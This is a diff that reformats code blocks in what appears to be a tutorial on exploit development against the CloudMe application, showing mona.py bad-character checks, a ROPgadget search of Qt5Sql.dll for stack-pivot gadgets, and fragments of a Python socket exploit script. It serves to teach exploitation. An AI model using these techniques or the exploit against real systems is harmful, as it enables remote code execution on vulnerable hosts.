@@ -500,7 +500,9 @@ Binary output saved in c:\logs\CloudMe\bytearray.bin
 
 <p align="justify">As we see above, we have already set the log file and we can also see the ascii hex characters generated from <b>mona.py</b>. Also, it is worth to mention that we don't need to include the '\x00' character in our character set, because it could cut off the rest of the characters, as it could be acting as a null terminator. Nevertheless, we can see if it is considered a bad character afterwards.</p>
 <p align="justify">Now, we can use the following command to compare the character set generated with <b>mona.py</b>, with the character set we have sent to the vulnerable <b>CloudMe</b> application.</p>
-<pre>0:000&gt; !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
+
+```
+0:000> !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
@@ -520,9 +522,14 @@ Comparing bytes from file with memory :
 0x0022d910 | Bytes omitted from input: 00
 
 [+] This mona.py action took 0:00:00.922000
-</pre>
+```
+
 <p align="justify">As we see above, we don't have bad characters, so we are good to go. But wait, not yet. Lets generate the badchars again, but at this time lets include the '\x00'. If we compare again the hex chars as we did before, we will see that the null byte considered to be a bad char as it is missing from the chars sent from the exploit.</p>
-<pre>0:000&gt; !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
+
+
+```
+
+0:000> !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
@@ -586,7 +593,8 @@ Comparing bytes from file with memory :
 0x0022d910 | 
 
 [+] This mona.py action took 0:00:00.875000
-</pre>
+```
+
 <p align="justify">At this point we are good to go. We can construct any shellcode now just excluding the null character.</p>
 <hr />
 <h3>4. Stack Pivoting</h3>
@@ -596,19 +604,25 @@ Comparing bytes from file with memory :
 Hold on...
 [.....]</pre>
 <p align="justify">If we take a closer look at the modules info table generated from mona, we can see that there are some specific modules with no restrictions at all. Furthermore we have identified one of these modules with no restrictions which is the <b>Qt5Sql.dll</b>. We can use this specific .dll in order to search for gadgets that can help us in stack pivoting.</p>
-<pre>pentest@pentest-PC MINGW32 ~/Desktop/ROPgadget (master)
+
+```
+pentest@pentest-PC MINGW32 ~/Desktop/ROPgadget (master)
 $ python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll" --only "ret" --depth 5 --badbytes "00"
 Gadgets information
 ============================================================
-<span style="color:#ff0000;">0x6d9c1011 : ret</span>
+0x6d9c1011 : ret
 0x6d9c35b1 : ret 0
 0x6d9cf7e4 : ret 0x10
 0x6d9d782a : ret 0x11b
 0x6d9d9c6a : ret 0x125
 [...]
-</pre>
+```
+
 <p align="justify">Using the <b>ROPgadget</b> tool ( clone from <a href="https://github.com/JonathanSalwan/ROPgadget">here </a>), we have chosen to search for gadgets from <b>Qt5Sql.dll</b>. The gadget we want to search is the <b>ret</b> instruction</p>
-<pre>import struct
+
+```python
+
+import struct
 import socket
 import sys<br />
 target = "127.0.0.1"
@@ -693,7 +707,9 @@ try:
   s.send(payload)
 except Exception as e:
   print(sys.exc_value)
-</pre>
+```
+
+
 <p align="justify">The following address <b>0x6d9c1011</b> was selected with the only purpose of setting a breakpoint in order to calculate <b>ESP</b> relative offset once we hit it. At this point we use the first 2236 bytes to get to <b>SEH</b>.</p>
 <pre>0:000&gt; bp 0x6d9c1011
 *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll - 
